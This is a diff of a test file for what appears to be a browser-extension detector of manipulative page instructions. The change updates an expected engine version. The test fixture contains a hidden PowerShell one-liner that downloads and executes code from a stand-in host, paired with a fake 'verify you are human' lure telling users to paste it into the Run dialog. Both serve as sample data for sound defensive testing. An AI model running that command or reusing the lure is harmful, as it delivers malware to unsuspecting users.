@@ -115,7 +115,7 @@ describe('classifyUrl (restricted pages)', () => {
   });
 });
 
-describe('engine 0.2.0 metadata reaches the popup intact (M4.3A)', () => {
+describe('engine metadata reaches the popup intact (M4.3A; engine 0.3.0 since D-083)', () => {
   const STAGED = 'powershell -w hidden -c "iex(irm https://x.example.invalid/p)"';
   const overrideSnap = () => snapshot([{ t: 'Verify you are human by completing these steps: press Win+R, then Ctrl+V and press Enter.', c: 'g', ctx: { overlay: true }, h: 'Security awareness check' }],
     { hidden: [{ text: STAGED, containerId: 'g', afterBlockId: 'b0' }] });
@@ -126,7 +126,7 @@ describe('engine 0.2.0 metadata reaches the popup intact (M4.3A)', () => {
 
   it('carries overrides with their hidden-clipboard evidence and survives validation', () => {
     const r = build(overrideSnap());
-    expect(r.engineVersion).toBe('0.2.0');
+    expect(r.engineVersion).toBe('0.3.0');
     const f = r.findings[0]!;
     expect(f.classification).toBe('manipulative_instruction');
     expect(f.overrides).toHaveLength(1);
